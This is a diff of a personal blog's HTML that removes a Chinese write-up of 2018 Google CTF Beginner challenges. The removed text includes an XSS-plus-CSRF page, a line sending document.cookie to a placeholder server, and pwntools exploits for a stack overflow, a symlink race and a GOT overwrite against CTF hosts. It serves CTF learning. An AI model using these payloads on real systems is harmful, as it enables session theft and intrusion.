@@ -22,7 +22,7 @@
     <meta name="description" content="hurricane618's blog">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>Google CTF Beginner Part1 · 风之栖息地|hurricane618&#39;s blog</title>
+    <title>风之栖息地|hurricane618&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -222,23 +222,12 @@
 </head>
 
     
-        <body class="post-body">
-    
     
 <header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
-    
-    <div class="banner">
-            <div class="blog-title">
-                <a href="/">风之栖息地</a>
-            </div>
-            <div class="post-title">
-                <a href="#" class="post-name">Google CTF Beginner Part1</a>
-            </div>
-    </div>
     
     <a class="home-link" href="/">风之栖息地</a>
 </header>
@@ -250,74 +239,24 @@
 
 
 
-
-height:50vh;
 ">
     
     <!-- 主页  -->
-    
-    
-    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/intro/post-bg1.jpg)"></div>
+    <div class="site-intro-img" style="background-image: url(/)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
-            
-            Google CTF Beginner Part1
-            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
-            
-            <!-- 404 -->
-            
         </p>
         <!-- 文章页meta -->
-        
-            <div class="post-intros">
-                <!-- 文章页标签  -->
-                
-                    <div class="post-intro-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="CTF">CTF</a>
-    
-</div>
-                
-                
-                    <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">2.4k</span>阅读时长: <span class="post-count reading-time">9 min</span></span>
-                    </div>
-                
-                <div class="post-intro-meta">
-                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2018/07/18</span>
-                    
-                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
-                        <span class="iconfont-archer">&#xe602;</span>
-                        <span id="busuanzi_value_page_pv"></span>
-                    </span>
-                    
-                    <span class="shareWrapper">
-                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
-                        <span class="shareText">Share</span>
-                        <ul class="shareList">
-                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
-                                <div class="share-qrcode"></div>
-                            </li>
-                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
-                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
-                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
-                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
-                        </ul>
-                    </span>
-                </div>
-            </div>
         
     </div>
 </div>
@@ -418,166 +357,39 @@ height:50vh;
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main post-page">
-    <article class="article-entry">
-        <p>会陆陆续续的把GoogleCTF题目的相关复现整理出来，这里先放一部分。通过这次Beginner训练还是了解到了许多之前没接触过的，比如PWN题中的libc地址问题。</p>
-<h2 id="LETTER-MISC"><a href="#LETTER-MISC" class="headerlink" title="LETTER(MISC)"></a>LETTER(MISC)</h2><p>原理说出来都很简单，考察的是PDF中表层的覆盖其实还是可读的，所以我们选中需要的内容复制粘贴出来就可以了</p>
-<img src="/2018/07/18/google-ctf-beginner-part1/1.png">
-<p>复制粘贴大法</p>
-<img src="/2018/07/18/google-ctf-beginner-part1/2.png">
-<h2 id="OCR-is-cool-MISC"><a href="#OCR-is-cool-MISC" class="headerlink" title="OCR is cool!(MISC)"></a>OCR is cool!(MISC)</h2><p>一道题考察图片转文字之后，运用古典加密解决问题。学到新的知识OCR，PDF或者图片转文本的技术。</p>
-<p><a href="https://www.onlineocr.net/" target="_blank" rel="noopener">在线转换链接</a></p>
-<img src="/2018/07/18/google-ctf-beginner-part1/3.png">
-<p>之后在凯撒加密中破解，因为题目中包含着凯撒，提示也是很明显了。</p>
-<img src="/2018/07/18/google-ctf-beginner-part1/4.png">
-<h2 id="MOAR-PWN"><a href="#MOAR-PWN" class="headerlink" title="MOAR(PWN)"></a>MOAR(PWN)</h2><p>考察了一个细节点，当我们处于man手册的状态下可以使用 !command 的方式来执行命令</p>
-<img src="/2018/07/18/google-ctf-beginner-part1/5.png">
-<p>我们就直接ls出home目录下有东西，然后cat出来即可。</p>
-<h2 id="Floppy-MISC"><a href="#Floppy-MISC" class="headerlink" title="Floppy(MISC)"></a>Floppy(MISC)</h2><p>给了一个图标文件，看了文本内容没什么东西，然后开始用binwalk分析一下</p>
-<img src="/2018/07/18/google-ctf-beginner-part1/6.png">
-<p>果然里面有东西，改成zip解压出来就ok了</p>
-<img src="/2018/07/18/google-ctf-beginner-part1/7.png">
-<h2 id="FLOPPY2-MISC"><a href="#FLOPPY2-MISC" class="headerlink" title="FLOPPY2(MISC)"></a>FLOPPY2(MISC)</h2><p>在上一道题目中留下了一个 <code>www.com</code> 文件，com后缀查了一下是MS-DOS的执行文件，所以现在的windows系统是无法执行的，DOSBOX启动！</p>
-<p>直接运行就出现一个毫无意义的话，没有什么结果之后把二进制文件转成文本看看其中的内容，也没有什么收获……</p>
-<p>经过其他人的Writeup之后得知要调试这个程序，在调试中发现，它会对其中的某个段取出字符异或然后重写回去，这样就好办了，一直跟踪调试，每次经过一些重写操作之后看看内存中的数据。最后得到flag。</p>
-<img src="/2018/07/18/google-ctf-beginner-part1/8.png">
-<h2 id="Security-By-Obsecurity-MISC"><a href="#Security-By-Obsecurity-MISC" class="headerlink" title="Security By Obsecurity(MISC)"></a>Security By Obsecurity(MISC)</h2><p>一道很猥琐的题目…… 通过file命令知道得到的文件是个zip压缩包，然后就开始了，一直解压解压解压。。。</p>
-<p>最后拿到一个password的压缩包里面有个password.txt需要密码，看他题目中有提示john，暗示John The Ripper，这个暴力破解工具。</p>
-<p>所以我们就暴力一下吧，我这里用的是ARCHPR</p>
-<img src="/2018/07/18/google-ctf-beginner-part1/9.png">
-<p>得到密码asdf，解压得到password.txt</p>
-<img src="/2018/07/18/google-ctf-beginner-part1/10.png">
-<p>拿到flag</p>
-<h2 id="Router-UI-Web"><a href="#Router-UI-Web" class="headerlink" title="Router-UI(Web)"></a>Router-UI(Web)</h2><p>打开网站是一个登录页面，输入账号和密码之后，发现会显示在页面上，根据题目的提示，XSS无疑。我们输入script验证漏洞，结果被chrome的auditor拦截。GG，这里img，svg等等标签失去作用，就算用src=javascript:alert(1) 这样的形式也会变成500……</p>
-<p>无奈之前，看了看别人的writeup，发现它们是利用了页面中的//分隔符，把script拆成了两个部分，这样就绕过了auditor的检查。</p>
-<p>那么可以引入js执行了，怎么偷管理员的cookie呢？必须要让管理员用这样的username和password登录才行，所以就是CSRF了。</p>
-<p>给管理员一个可以自动提交的网站，提交这些内容，就会触发js拿到cookie。代码如下：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">action</span>=<span class="string">"https://router-ui.web.ctfcompetition.com/login?next=https%3A%2F%2Frouter-ui.web.ctfcompetition.com%2F"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">value</span>=<span class="string">"&lt;script src=https:"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"xxxxx/img/11.js&gt;&lt;/script&gt;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"b"</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.getElementById(<span class="string">"b"</span>).click();</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>在11.js中，放入偷cookie的语句。</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="keyword">new</span> Image();</span><br><span class="line">img.src = <span class="string">"http://xxxxxx/?c="</span> + <span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure>
-<p>这样在我们的服务器的日志中就可以看到带有cookie的请求了。但是由于比赛已经结束，估计机器人也没了，所以只能直接抄wp中的cookie进入后台。</p>
-<img src="/2018/07/18/google-ctf-beginner-part1/11.png">
-<p>添加cookie之后，重新登录就会进入控制页面了</p>
-<img src="/2018/07/18/google-ctf-beginner-part1/12.png">
-<p>最后在网页中找到flag</p>
-<p>在XSS的构造中利用//来包含链接比较有意思，其他的就是中规中矩的CSRF+XSS的连锁。</p>
-<h2 id="Message-of-the-day-PWN"><a href="#Message-of-the-day-PWN" class="headerlink" title="Message of the day(PWN)"></a>Message of the day(PWN)</h2><p>先按照国际惯例检查一下程序的安全保护。</p>
-<img src="/2018/07/18/google-ctf-beginner-part1/13.png">
-<p>开启了NX意味着无法在内存中无法执行代码，所以这里就没有办法写shellcode执行拿权限。分析之后发现输入点处有不安全的gets函数，所以我们是可以栈溢出的。</p>
-<img src="/2018/07/18/google-ctf-beginner-part1/14.png">
-<p>但是，没有办法写shellcode，那么还有什么办法可以拿到flag呢，在分析程序时看到在选项4中会有读取flag的操作，必须是管理员才能执行。</p>
-<p>既然无法写shellcode，那么我们覆盖返回地址用ret2libc的思路去拿flag，应该是行的，我们知道读取flag的函数地址，只要把返回地址覆盖成这个地址即可。</p>
-<p>src是一个0x100的栈，要栈溢出的话就要padding A*(0x100 + SP寄存器的大小)</p>
-<img src="/2018/07/18/google-ctf-beginner-part1/15.png">
-<p>发现是RSP64位寄存器，那么我们最后的padding就是 A*(0x100+8)，地址我们也查到了是 00000000606063A5，所以最终代码如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">"motd.competition.com"</span>, <span class="number">1337</span>)</span><br><span class="line">r.send(<span class="string">"2\n"</span>)</span><br><span class="line">r.send(<span class="string">"A"</span>*<span class="number">0x108</span> + <span class="string">"\xA5\x63\x60\x60\x00\x00\x00\x00"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-<p>运行一下，拿到flag</p>
-<img src="/2018/07/18/google-ctf-beginner-part1/16.png">
-<h2 id="Poetry-PWN"><a href="#Poetry-PWN" class="headerlink" title="Poetry(PWN)"></a>Poetry(PWN)</h2><p>有趣的一道题，开启了栈保护，所以栈溢出是不存在了。那么看看IDA中的内容。</p>
-<img src="/2018/07/18/google-ctf-beginner-part1/17.png">
-<p>其中的LD_BIND_NOW 在网上查出来的结果，当这个变量设置为1的时候，会让连接器在程序执行前把所有的函数地址都连接好。</p>
-<p>然后会用readlink读取 /proc/self/exe 就可以获取当前程序的绝对路径，之后设置 LD_BIND_NOW为1，再次执行该程序。</p>
-<p>这里有个trick，就是如果在程序执行readlink(/proc/self/exe )的时候改变源程序，那么readlink得到的内容就会变成 原路径+” (deleted)”</p>
-<p>所以只要我们在程序运行时对它做改动，它的readlink就会是另外一个名称，然后利用新的名称执行我们想要的命令。</p>
-<p>由于我们的flag在其他用户的目录中，我们无法读取，所以思路就是改动程序让它执行我们控制好的其他程序读取flag，我们是没有权限的，但是poetry有这个权限。</p>
-<p>这里，我们先用ln链接 poetry，得到一个我们自己的poetry，随后ln -s 硬链接cat 命名为 poetry(deleted)，这样我们在执行我们链接的poetry flag，然后删除我们的链接程序，就会触发cat 读取flag，整个过程都是poetry用户的权限，所以没问题。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">"poetry.ctfcompetition.com"</span>,<span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line">r.send(<span class="string">"ln -s /bin/cat '/home/user/poetry (deleted)'\n"</span>)</span><br><span class="line">r.send(<span class="string">"ln /home/poetry/poetry /home/user/poetry\n"</span>)</span><br><span class="line">r.send(<span class="string">"(/home/user/poetry /home/poetry/flag &amp;);rm /home/user/poetry\n"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-<p>最后这个脚本要多跑几次，因为这个是条件竞争的漏洞，最后通过这个flag了解到CVE-2009-1894，这个洞的触发条件就是在我们执行程序的时候，正好删除了原始链接程序，然后使得readlink返回我们伪造的程序路径从而执行恶意操作。</p>
-<img src="/2018/07/18/google-ctf-beginner-part1/18.png">
-<p>拿到flag CVE链接 <code>http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1894</code></p>
-<h2 id="Fridge-ToDo-List-PWN"><a href="#Fridge-ToDo-List-PWN" class="headerlink" title="Fridge ToDo List(PWN)"></a>Fridge ToDo List(PWN)</h2><p>开启了PIE，无法在内存中确定具体的地址了。现在先看看程序有什么功能，1-6个选项。</p>
-<ol>
-<li>打印列表</li>
-<li>打印ToDo的任务</li>
-<li>存储ToDo任务</li>
-<li>删除ToDo任务</li>
-<li>远程管理员</li>
-<li>退出</li>
-</ol>
-<p>首先第一个选项，就仅仅是打印，没什么输入，放弃。</p>
-<p>第二个第三个第四个会有编号输入，第二个有读操作，第三个有写操作，所以重点就是这两个。</p>
-<p>第五个查看源码就知道只是一个幌子。</p>
-<p>第六个没啥好说的，退出操作。</p>
-<p>看到第二个和第三个操作中都有同样的代码</p>
-<img src="/2018/07/18/google-ctf-beginner-part1/19.png">
-<p>这里只检查了是否大于最大数量，并没有限制是否小于0,。所以我们可以越界读和写。</p>
-<p>通过IDA我们分析看到 todo从0x203140开始，间隔为0x30，那么往上面看看有什么可以读写的。</p>
-<img src="/2018/07/18/google-ctf-beginner-part1/20.png">
-<p>不错，在.got.plt部分，我们可以读取到这三个函数的地址，泄露了函数地址，意味着我们可以得到libc的信息。</p>
-<p>之后该怎么利用呢？这里我们看到atoi是每次我们输入编号都会调用的函数，atoi而且还在open的附近，那么我们可以把atoi覆盖成system执行我们的任意命令，造成命令执行。所以剩下的就简单了，执行写操作，通过之前泄露的libc得到system的地址，覆盖atoi的地址。代码如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> unpack,pack</span><br><span class="line">r = remote(<span class="string">"fridge-todo-list.ctfcompetition.com"</span>,<span class="number">1337</span>)</span><br><span class="line">r.send(<span class="string">"whz\n"</span>)</span><br><span class="line">r.readuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">r.send(<span class="string">"2\n"</span>)</span><br><span class="line">r.readuntil(<span class="string">"read?"</span>)</span><br><span class="line">r.send(<span class="string">"-6\n"</span>)</span><br><span class="line">res = r.readuntil(<span class="string">"Hi whz,"</span>).splitlines()[<span class="number">0</span>]</span><br><span class="line">write_addr = res.split(<span class="string">':'</span>,<span class="number">1</span>)[<span class="number">1</span>][<span class="number">1</span>:].ljust(<span class="number">8</span>,chr(<span class="number">0</span>))</span><br><span class="line">write_addr = unpack(<span class="string">"&lt;Q"</span>,write_addr)[<span class="number">0</span>]</span><br><span class="line">base_addr = write_addr<span class="number">-0x910</span></span><br><span class="line">system_addr = base_addr + <span class="number">0x940</span></span><br><span class="line">r.readuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">r.send(<span class="string">"3\n"</span>)</span><br><span class="line">r.readuntil(<span class="string">"entry?"</span>)</span><br><span class="line">r.send(<span class="string">"-4\n"</span>)</span><br><span class="line">r.send(<span class="string">"A"</span>*<span class="number">8</span>+pack(<span class="string">"&lt;Q"</span>,system_addr)+<span class="string">"\n"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-<p>之后执行命令，查看用户</p>
-<img src="/2018/07/18/google-ctf-beginner-part1/21.png">
-<p>得到用户名，随后nc连上去，直接用该用户登录</p>
-<img src="/2018/07/18/google-ctf-beginner-part1/22.png">
-<p>得到flag</p>
-<p>这里要吐槽一点的是，这个泄露的libc一直没找到……，所以直接套用的其他人的exp。第一次感觉PWN也是蛮坑的。。。</p>
-
-    </article>
-    <!-- license  -->
+            <main class="main index-page">
     
-        <div class="license-wrapper">
-            <p>原文作者：<a href="https://hurricane618.me">hurricane618</a>
-            </p><p>原文链接：<a href="https://hurricane618.me/2018/07/18/google-ctf-beginner-part1/">https://hurricane618.me/2018/07/18/google-ctf-beginner-part1/</a>
-            </p><p>发表日期：<a href="https://hurricane618.me/2018/07/18/google-ctf-beginner-part1/">July 18th 2018, 11:03:09 pm</a>
-            </p><p>更新日期：<a href="https://hurricane618.me/2018/07/18/google-ctf-beginner-part1/">July 19th 2018, 9:16:00 am</a>
-            </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href="/2022/11/27/seven-years-of-my-life1/">
+            
+                <span>我的人生七年（一）</span>
+        </a>
+        <div class="abstract-content">
+            距离研究生毕业已经过了4个多月，在这个国庆节期间遇见了很多老同学，包括高中和大学同学，感觉到过了这么几年每个人的人生轨迹都发生了翻天覆地的变化，我想也是时候对自己第一个“人生七年”做个总结，想把这些珍贵的内容记录下来，或许多年之后再次回看会别有一番滋味在心头。至于为什么我说是自己的第一个“人生七年”，这七年是我大学本科四年加上研究生三年的时光，没有提起小学中学是因为我觉得那段时间个人能掌控的并不多，很多抉择都是被家长代替选择或者逼着选的，只有从这七年开始大部分决定都是由我个人做出，这是人生真正的开始。希望这个系列我以后能一直更新下去，每七年做一次总结，为自己的人生做复盘，至于为什么是七年...
         </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2022/11/27</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class="abstract-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="人生">人生</a>
+    
+</div>
+            
+        </div>
+    </article>
     
     <!-- paginator  -->
-    <ul class="post-paginator">
-        <li class="next">
-            
-                <div class="nextSlogan">Next Post</div>
-                <a href="/2018/08/01/dianfengjikeCTF-web/" title="巅峰极客CTF 部分Web复现">
-                    <div class="nextTitle">巅峰极客CTF 部分Web复现</div>
-                </a>
-            
-        </li>
-        <li class="previous">
-            
-                <div class="prevSlogan">Previous Post</div>
-                <a href="/2018/07/08/google-ctf-beginner-js-safe-1/" title="Google CTF Beginner JS Safe 1 复现">
-                    <div class="prevTitle">Google CTF Beginner JS Safe 1 复现</div>
-                </a>
-            
-        </li>
-    </ul>
-    <!-- 评论插件 -->
-    <!-- 来必力City版安装代码 -->
-
-<!-- City版安装代码已完成 -->
     
-    <div id="disqus_thread"></div>
-    <script>
-        /**
-    *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
-    *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
-        
-        var disqus_config = function () {
-        this.page.url = "https://hurricane618.me/2018/07/18/google-ctf-beginner-part1/";  // Replace PAGE_URL with your page's canonical URL variable
-        this.page.identifier = "Google CTF Beginner Part1"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
-        };
-        
-        (function () { // DON'T EDIT BELOW THIS LINE
-            var d = document, s = d.createElement('script');
-            s.src = 'https://hurricane618.disqus.com/embed.js';
-            s.setAttribute('data-timestamp', +new Date());
-            (d.head || d.body).appendChild(s);
-        })();
-
-    </script>
-    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-
-    
-    <!-- partial('_partial/comment/changyan') -->
-    <!--PC版-->
-
-
-    
-    
-
-    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -664,24 +476,6 @@ height:50vh;
 
     </div>
     <!-- toc -->
-    
-    <div class="toc-wrapper" style=
-    
-
-
-
-
-
-
-
-top:50vh;
-
-    >
-        <div class="toc-catalog">
-            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
-        </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#LETTER-MISC"><span class="toc-number">1.</span> <span class="toc-text">LETTER(MISC)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OCR-is-cool-MISC"><span class="toc-number">2.</span> <span class="toc-text">OCR is cool!(MISC)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MOAR-PWN"><span class="toc-number">3.</span> <span class="toc-text">MOAR(PWN)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Floppy-MISC"><span class="toc-number">4.</span> <span class="toc-text">Floppy(MISC)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FLOPPY2-MISC"><span class="toc-number">5.</span> <span class="toc-text">FLOPPY2(MISC)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Security-By-Obsecurity-MISC"><span class="toc-number">6.</span> <span class="toc-text">Security By Obsecurity(MISC)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Router-UI-Web"><span class="toc-number">7.</span> <span class="toc-text">Router-UI(Web)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Message-of-the-day-PWN"><span class="toc-number">8.</span> <span class="toc-text">Message of the day(PWN)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Poetry-PWN"><span class="toc-number">9.</span> <span class="toc-text">Poetry(PWN)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fridge-ToDo-List-PWN"><span class="toc-number">10.</span> <span class="toc-text">Fridge ToDo List(PWN)</span></a></li></ol>
-    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -1527,8 +1321,6 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
-    
-        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
